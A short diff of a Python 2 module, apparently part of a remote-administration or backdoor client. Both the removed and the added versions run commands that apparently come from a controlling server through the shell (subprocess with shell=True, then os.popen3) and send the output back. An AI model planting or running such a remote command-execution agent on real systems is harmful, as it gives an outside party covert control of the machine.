@@ -1,22 +1,13 @@
-import subprocess
 import os
+import requests
 
-import server
+import utils
 
 
-def run():
-    output = ""
-    cmd = server.hello()
-    if cmd.startswith("cd "):
-        try:
-            os.chdir(cmd.split(" ")[1])
-        except OSError, err:
-            output = str(err)
-    else:
-        try:
-            proc = subprocess.Popen(cmd.split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            output = proc.stdout.read() + proc.stderr.read()
-        except OSError, err:
-            output = str(err)
-    server.tell(output)
- 
+def run(cmd):
+    stdin, stdout, stderr = os.popen3(cmd)
+    output = stdout.read() + stderr.read()
+    if os.name == "nt":
+        output = output.decode('cp1252')
+    output = cmd + "\n\n" + output
+    utils.send_output(output)
